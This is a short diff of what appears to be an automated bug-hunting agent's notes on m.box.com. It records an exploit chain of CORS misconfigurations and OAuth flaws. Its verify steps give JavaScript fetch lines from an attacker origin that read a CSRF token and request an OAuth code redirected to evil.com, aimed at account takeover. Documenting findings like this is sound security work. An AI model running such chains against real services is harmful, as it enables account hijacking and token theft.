@@ -37,7 +37,6 @@
   "status": "IN_PROGRESS",
   "last_advance": "2026-08-22 04:43:13 UTC"
 }=== MY LAST LEADS (tail) ===
-confidence: 96
 reasoning: Three endpoints form complete exploit chain: (1) /login reflects origin + exposes CSRF request_token cross-origin, (2) /api/oauth2/authorize reflects origin + allows GET/HEAD + reflects attacker-controlled state/redirectUri/clientId in response, (3) /api/oauth2/token has wildcard * CORS + allows POST+Content-Type. All confirmed via read-only probes this cycle. Chain enables: read CSRF token → read OAuth state → exchange for tokens.
 verify_steps: (HUMAN_ONLY) From attacker origin: 1) `fetch('/login',{credentials:'include'}).then(r=>r.text()).then(t=>extract(t,/request_token.*?value="([^"]+)"/))` 2) `fetch('/api/oauth2/authorize?response_type=code&client_id=ID&redirect_uri=https://evil.com/callback',{credentials:'include'}).then(r=>r.text())` 3) POST to /api/oauth2/token with auth code
 impact: Full account takeover via OAuth token theft. Severity: Critical
@@ -97,6 +96,7 @@ testability: PASSIVE
 ## 2026-08-22 20:00:20 UTC m.box.com (mimo)
 ## 2026-08-22 20:26:16 UTC m.box.com (mimo)
 ## 2026-08-22 20:46:04 UTC m.box.com (mimo)
+## 2026-08-22 21:01:08 UTC m.box.com (mimo)
 === RANKED HYPOTHESES (tail) ===
 
 ## RANKED 2026-08-22 18:45:34 UTC
